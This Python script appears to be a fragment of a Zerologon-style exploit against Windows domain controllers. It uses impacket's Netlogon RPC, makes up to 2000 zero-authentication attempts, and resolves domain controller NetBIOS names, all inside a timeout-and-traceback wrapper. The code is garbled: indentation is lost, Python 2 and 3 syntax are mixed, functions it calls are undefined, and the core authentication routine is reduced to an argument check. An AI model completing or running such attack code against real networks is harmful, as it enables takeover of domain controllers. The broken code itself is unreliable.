#!/usr/bin/env python3
import sys
import traceback
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Exploit execution timed out")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(60)

try:
    from nmb.NetBIOS import NetBIOS
    import argparse, threading, queue, os.path
    from termcolor import cprint
    from impacket.dcerpc.v5 import nrpc, epm
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.dcerpc.v5 import transport
    from impacket import crypto
    import hmac, hashlib, struct, sys, socket, time, pyfiglet
    from binascii import hexlify, unhexlify
    from subprocess import check_call
    ochered = queue.Queue()
    MAX_ATTEMPTS = 2000
    def getBIOSName2(remote_add):
    try:
    hostName = socket.gethostbyaddr(remote_add)
    except Exception as error:
    return "continue321"
    if hostName[0] == "":
    return "continue321"
    else:
    return hostName[0].split(".")[0]
    def getBIOSName(remote_smb_ip, timeout=30):
    try:
    bios = NetBIOS()
    srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)
    except:
    print >> sys.stderr, "Looking up timeout, check remote_smb_ip again!!"
    finally:
    bios.close()
    return srv_name
    def start(*args):
    while True:
    if ochered.empty() == True:
    exit()
    else:
    dc_ip = ochered.get()
    if name == "empty":
    try:
    dc_name = getBIOSName(dc_ip)[0]
    except Exception as error:
    dc_name = getBIOSName2(dc_ip)
    else:
    dc_name = name
    if dc_name == "continue321":
    cprint("[-] Cant get NetBIOS computer name. IP = {}".format(dc_ip), "red")
    continue
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
    def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]

except Exception as e:
    print(f"Error: {e}")
    traceback.print_exc()
finally:
    signal.alarm(0)
